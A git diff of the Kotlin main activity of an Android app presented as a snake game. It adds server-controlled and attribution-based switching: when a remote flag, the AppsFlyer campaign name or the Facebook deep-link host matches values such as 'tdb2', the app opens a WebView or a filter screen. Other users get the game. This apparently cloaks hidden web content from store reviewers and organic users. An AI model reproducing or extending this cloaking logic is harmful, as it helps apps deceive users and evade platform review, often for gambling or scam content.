@@ -2,8 +2,8 @@ package com.snake.io.slither
 
 import android.content.Context
 import android.content.Intent
-import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
+import androidx.appcompat.app.AppCompatActivity
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.facebook.applinks.AppLinkData
@@ -16,7 +16,6 @@ import com.snake.io.slither.AplClasssssssss.Companion.linkAppsCheckPart2
 import com.snake.io.slither.databinding.ActivityMainBinding
 import com.snake.io.slither.gamerrrrr.GameHolderActivity
 import kotlinx.coroutines.*
-import java.lang.Exception
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -31,26 +30,36 @@ class MainActivity : AppCompatActivity() {
         bindMain = ActivityMainBinding.inflate(layoutInflater)
         setContentView(bindMain.root)
         jsoup = ""
-
         deePP(this)
 
         val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
         if (prefs.getBoolean("activity_exec", false)) {
-
+            //второе включение
             val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
             when (sharPref.getString(CH, "null")) {
                 "2" -> {
                     skipMe()
                 }
                 "3" -> {
+                    testMeUAC()
+                }
+                "4" -> {
                     testWV()
                 }
-
+                "nm" -> {
+                    testWV()
+                }
+                "dp" -> {
+                    testWV()
+                }
+                "org" -> {
+                    skipMe()
+                }
                 else -> {
-                    toTestGrounds()
+                    skipMe()
                 }
             }
-            //второе включение
+
         } else {
             val exec = prefs.edit()
             exec.putBoolean("activity_exec", true)
@@ -75,14 +84,17 @@ class MainActivity : AppCompatActivity() {
                 }
                 "2" -> {
                     skipMe()
-
                 }
                 "3" -> {
+                    AppsFlyerLib.getInstance()
+                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
+                    AppsFlyerLib.getInstance().start(this)
+                    afRecordedForUAC(1500)
+                }
+                "4" -> {
                     testWV()
                 }
-                "0" -> {
-                    toTestGrounds()
-                }
+
             }
         }
     }
@@ -94,6 +106,7 @@ class MainActivity : AppCompatActivity() {
         val oneStr = "1"
         val twoStr = "2"
         val testStr = "3"
+        val fourStr = "4"
         val activeStrn = "0"
         val urlConnection = withContext(Dispatchers.IO) {
             url.openConnection()
@@ -101,6 +114,10 @@ class MainActivity : AppCompatActivity() {
 
         return try {
             when (val text = urlConnection.inputStream.bufferedReader().readText()) {
+
+                "1" -> {
+                    oneStr
+                }
                 "2" -> {
                     val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                     val editor = sharPref.edit()
@@ -108,15 +125,19 @@ class MainActivity : AppCompatActivity() {
                     editor.apply()
                     twoStr
                 }
-                "1" -> {
-                    oneStr
-                }
                 "3" -> {
                     val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                     val editor = sharPref.edit()
                     editor.putString(CH, testStr)
                     editor.apply()
                     testStr
+                }
+                "4" -> {
+                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
+                    val editor = sharPref.edit()
+                    editor.putString(CH, fourStr)
+                    editor.apply()
+                    fourStr
                 }
                 else -> {
                     activeStrn
@@ -134,8 +155,25 @@ class MainActivity : AppCompatActivity() {
         return CoroutineScope(Dispatchers.IO).launch {
             while (NonCancellable.isActive) {
                 val hawk1: String? = sharPref.getString(C1, null)
+                val hawkdeep: String? = sharPref.getString(D1, "null")
                 if (hawk1 != null) {
-                    toTestGrounds()
+                    if(hawk1.contains("tdb2")){
+                        val editor = sharPref.edit()
+                        editor.putString(CH, "nm")
+                        editor.apply()
+                        testWV()
+                    } else if (hawkdeep != null){
+                        if(hawkdeep.contains("tdb2"))
+                        {
+                            testWV()
+                        }
+                        else{
+                            val editor = sharPref.edit()
+                            editor.putString(CH, "org")
+                            editor.apply()
+                            skipMe()
+                        }
+                    }
                     break
                 } else {
                     val hawk1: String? = sharPref.getString(C1, null)
@@ -145,15 +183,28 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-
+    private fun afRecordedForUAC(timeInterval: Long): Job {
+        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
+        return CoroutineScope(Dispatchers.IO).launch {
+            while (NonCancellable.isActive) {
+                val hawk1: String? = sharPref.getString(C1, null)
+                if (hawk1 != null) {
+                    testMeUAC()
+                    break
+                } else {
+                    val hawk1: String? = sharPref.getString(C1, null)
+                    delay(timeInterval)
+                }
+            }
+        }
+    }
 
     val conversionDataListener = object : AppsFlyerConversionListener {
         override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
             val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
             val editor = sharPref.edit()
-
             val dataGotten = data?.get("campaign").toString()
-            editor.putString(C1, dataGotten)
+            editor.putString(C1,dataGotten)
             editor.apply()
         }
 
@@ -169,14 +220,14 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun toTestGrounds() {
-        Intent(this, SortedActivity::class.java)
-            .also { startActivity(it) }
-        finish()
-    }
 
     private fun skipMe() {
         Intent(this, GameHolderActivity::class.java)
+            .also { startActivity(it) }
+        finish()
+    }
+    private fun testMeUAC() {
+        Intent(this, CanIFilterYouActivity::class.java)
             .also { startActivity(it) }
         finish()
     }
@@ -193,12 +244,19 @@ class MainActivity : AppCompatActivity() {
         ) { appLinkData: AppLinkData? ->
             appLinkData?.let {
                 val params = appLinkData.targetUri.host
-                editor.putString(D1, params.toString())
+                //тест
+                editor.putString(D1,params.toString())
                 editor.apply()
+                if (params!!.contains("tdb2")){
+                    editor.putString(CH, "dp")
+                    editor.apply()
+                }
+
             }
             if (appLinkData == null) {
 
             }
+
         }
     }
 
